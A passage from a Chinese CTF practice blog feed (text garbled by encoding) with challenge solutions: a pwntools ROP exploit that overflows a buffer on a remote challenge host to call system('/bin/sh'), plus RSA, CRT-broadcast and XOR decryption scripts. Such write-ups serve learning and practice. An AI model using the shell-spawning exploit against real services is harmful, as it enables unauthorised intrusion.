ä¸€ä¸ªlibc</p><h5 id="checksecï¼š"><a href="#checksecï¼š" class="headerlink" title="checksecï¼š"></a>checksecï¼š</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ä¿æŠ¤å¾ˆå¼±ï¼Œæœ‰NXï¼Œå¯ä»¥ROP</p><h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA:"></a>IDA:</h5><p>systemè¢«ç§»èµ°äº†ï¼Œè¦ç”¨ROP</p><h5 id="ROPgadgetï¼š"><a href="#ROPgadgetï¼š" class="headerlink" title="ROPgadgetï¼š"></a>ROPgadgetï¼š</h5><p>å‘ç°rdi</p><h4 id="3-åæ€"><a href="#3-åæ€" class="headerlink" title="3.åæ€"></a>3.åæ€</h4><p>1.libcSearchæ‰¾ä¸åˆ°åŒ¹é…æ–‡ä»¶ï¼Œå› æ­¤ç”¨é¢˜ç›®æä¾›çš„æœ¬åœ°æ–‡ä»¶ã€‚</p><p>2.æº¢å‡ºçš„å­—ç¬¦ä¸²å­˜åœ¨äºvulnçš„æ ˆå¸§ä¸­ï¼Œæ‰€ä»¥ROPçš„å†…å®¹æ˜¯åœ¨vulnç»“æŸæ‰§è¡Œä¹‹åæ‰è°ƒç”¨çš„</p><p>ï¼ˆéå¸¸é‡è¦ï¼ï¼å°±å› ä¸ºè¿™ä¸ªæˆ‘å¡äº†è¿™ä¹ˆä¹…ï¼ï¼ï¼ï¼‰</p><p>3.å¦‚æœç¨‹åºå¼€å¯äº†ASLRçš„ä¿æŠ¤æœºåˆ¶ï¼Œæ¯æ¬¡æ³„éœ²çš„åœ°å€å°±ä¼šå˜</p><p>4.æ³„éœ²ç”¨çš„å‡½æ•°ä¸ä¸€å®šè¦æ˜¯writeï¼ˆå®¹æ˜“å‡ºé”™ï¼‰ï¼Œåªè¦æ˜¯IDAä¸­æœ‰çš„functionéƒ½æ˜¯å¯ä»¥ç”¨çš„ï¼Œæ¯”å¦‚putsï¼Œå’Œç”¨ä»€ä¹ˆè¾“å‡ºæ— å…³ã€‚</p><h2 id="Introduce-yourself-againâ€”â€”pwn"><a href="#Introduce-yourself-againâ€”â€”pwn" class="headerlink" title="Introduce yourself againâ€”â€”pwn"></a>Introduce yourself againâ€”â€”pwn</h2><p><em>dateï¼š20230827</em></p><p><strong>æ³¨ï¼šæ¯”è¾ƒæ‡’ï¼Œè¿™ç¯‡è®°å½•å°±ä¸ä½œè¯¦ç»†è§£æäº†</strong></p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = ELF(<span class="string">&#x27;../vuln&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;1.container.jingsai.apicon.cn&#x27;</span>,<span class="number">31583</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœ /bin/sh åœ¨ä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶æˆ– libc ä¸­</span></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(binary.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="comment"># nextç”¨äºå°†è¿­ä»£å™¨è½¬åŒ–ä¸ºåœ°å€ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶å¯¼å…¥äº† system å‡½æ•°ï¼Œå¦åˆ™ä½ éœ€è¦ä» libc ä¸­æ‰¾åˆ°å®ƒ</span></span><br><span class="line">system_addr = binary.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ ROPé“¾</span></span><br><span class="line">rop_chain = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span>  <span class="comment"># å¡«å……ç¼“å†²åŒºï¼ˆ32+8ï¼‰</span></span><br><span class="line">rop_chain += p64(<span class="number">0x401283</span>)  <span class="comment"># pop rdi ; ret çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># returnåˆ°äº†rdiä¹‹åï¼Œè½¬åˆ°&#x27;system(&#x27;/bin/sh&#x27;)&#x27;</span></span><br><span class="line">rop_chain += p64(binsh_addr)         <span class="comment"># /bin/sh çš„åœ°å€</span></span><br><span class="line">rop_chain += p64(system_addr)        <span class="comment"># system å‡½æ•°çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">p.sendline(rop_chain)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ez-RSAâ€”â€”cypto"><a href="#ez-RSAâ€”â€”cypto" class="headerlink" title="ez_RSAâ€”â€”cypto"></a>ez_RSAâ€”â€”cypto</h2><p><img src="/images/1.png" alt="1"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> isqrt, invert</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"></span><br><span class="line">n = <span class="number">90938392456291254525076945024729747747760465730974669418706248227861886309375529663735627415245417634394729586919547147792773340180198391198314430274518933727253498184961383171260516587457792799707287325039224408079898775410581161837617160304998792211064631247289074677708936697313549567484094343014332084339</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">45364797306235971944260226800635151351008146862295270630931485461400677931474845001179392584827173887899973869918030404844235023951265629425837039670402124263530793496501526611946694844071734068320021250788698711162051512227685780168559259017820474609757591818839612837707915716391578907729532072964242156512</span></span><br><span class="line"></span><br><span class="line">x = isqrt(n)</span><br><span class="line"><span class="comment"># ä¸€ä¸ªå¼€å¹³æ–¹æ•´æ•°</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> (isprime(x) <span class="keyword">and</span> isprime(n//x)):</span><br><span class="line">    x-=<span class="number">1</span></span><br><span class="line">p = x</span><br><span class="line">q = n // x</span><br><span class="line"><span class="comment"># â€œ//â€ æ˜¯æ•´é™¤</span></span><br><span class="line"><span class="comment"># ä¿è¯på’Œqä¹Ÿæ˜¯ç´ æ•°</span></span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="comment"># Ï•(n)=(pâˆ’1)(qâˆ’1)</span></span><br><span class="line"></span><br><span class="line">d = invert(e, phi_n)</span><br><span class="line"><span class="comment">#d ä¸º e å…³äºæ¨¡ Ï•(n) çš„é€†å…ƒ</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the number to bytes</span></span><br><span class="line">b_res = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="comment"># -&gt;ç»“æœ = mè½¬åŒ–ä¸ºå­—èŠ‚å½¢å¼(ä½é•¿ + 7 // 8 = å­—èŠ‚é•¿åº¦ï¼Œå¤§ç«¯æ¨¡å¼)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode the bytes to a string using UTF-8 encoding</span></span><br><span class="line">str_res = b_res.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str_res)</span><br></pre></td></tr></table></figure><h2 id="modulusâ€”â€”crypto"><a href="#modulusâ€”â€”crypto" class="headerlink" title="modulusâ€”â€”crypto"></a>modulusâ€”â€”crypto</h2><h4 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„å€¼å†™åœ¨è¿™é‡Œï¼Œç”±äºå¤ªå¤šå°±çœç•¥äº†</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚è§£C</span></span><br><span class="line">N = n1 * n2 * n3</span><br><span class="line">N1 = N // n1</span><br><span class="line">N2 = N // n2</span><br><span class="line">N3 = N // n3</span><br><span class="line">u1 = inverse(N1, n1)</span><br><span class="line">u2 = inverse(N2, n2)</span><br><span class="line">u3 = inverse(N3, n3)</span><br><span class="line"></span><br><span class="line">C = (c1 * u1 * N1 + c2 * u2 * N2 + c3 * u3 * N3) % N</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç‰›é¡¿æ³•æ¥è¿‘ä¼¼è®¡ç®—C^(1/e)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_root</span>(<span class="params">x, n</span>):</span><br><span class="line">    getcontext().prec = <span class="number">100</span>  <span class="comment"># è®¾ç½®å¾ˆé«˜çš„ç²¾åº¦</span></span><br><span class="line">    guess = Decimal(x)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        better_guess = ((n - <span class="number">1</span>) * guess + x / guess**(n - <span class="number">1</span>)) / n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(guess - better_guess) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> +better_guess</span><br><span class="line">        guess = better_guess</span><br><span class="line"></span><br><span class="line">m_recovered = nth_root(C, e)</span><br><span class="line">flag_recovered = long_to_bytes(<span class="built_in">int</span>(m_recovered))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag_recovered)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„å€¼å†™åœ¨è¿™é‡Œï¼Œç”±äºå¤ªå¤šå°±çœç•¥äº†</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">c, n, e</span>):</span><br><span class="line">    N = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> ni <span class="keyword">in</span> n:</span><br><span class="line">        N *= ni</span><br><span class="line"></span><br><span class="line">    residues = [(N // ni) * inverse(N // ni, ni) <span class="keyword">for</span> ni <span class="keyword">in</span> n]</span><br><span class="line">    C = <span class="built_in">sum</span>([ci * ri <span class="keyword">for</span> ci, ri <span class="keyword">in</span> <span class="built_in">zip</span>(c, residues)]) % N</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nth_root</span>(<span class="params">x, n</span>):</span><br><span class="line">        getcontext().prec = <span class="number">100</span></span><br><span class="line">        guess = Decimal(x)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            new_guess = ((n - <span class="number">1</span>) * guess + x / guess**(n - <span class="number">1</span>)) / n</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(guess - new_guess) &lt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> +new_guess</span><br><span class="line">            guess = new_guess</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">int</span>(nth_root(C, e)))</span><br><span class="line"></span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line"><span class="built_in">print</span>(recover_flag(c, n, <span class="number">17</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2.jpg" alt="2"></p><p><img src="/images/3.jpg" alt="3"></p><h2 id="XORâ€”â€”crypto"><a href="#XORâ€”â€”crypto" class="headerlink" title="XORâ€”â€”crypto"></a>XORâ€”â€”crypto</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">b&#x27;\x89\x86\x17\x02RB\x87\xff\x01\x1c1J\x80\xae\x0c1eO\xba\xbd`*bU\xba\x90c3eK\xbe\xbb:,nD&#x27;</span></span><br><span class="line">known_prefix = <span class="string">b&quot;VIDAR&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Recover the key from the known prefix</span></span><br><span class="line">key = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(known_prefix)):</span><br><span class="line">    key.append(known_prefix[i] ^ enc[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now you have the first few bytes of the key. Let&#x27;s attempt to decrypt the rest of the message.</span></span><br><span class="line"><span class="comment"># As the key is only 6 bytes, we need only the first 6 bytes to decrypt the entire message.</span></span><br><span class="line"></span><br><span class="line">decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    decrypted.append(enc[i] ^ key[i % <span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFåšé¢˜è®°å½•</category>
      
      
      <comments>https://cjliblog.top/2023/08/27/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
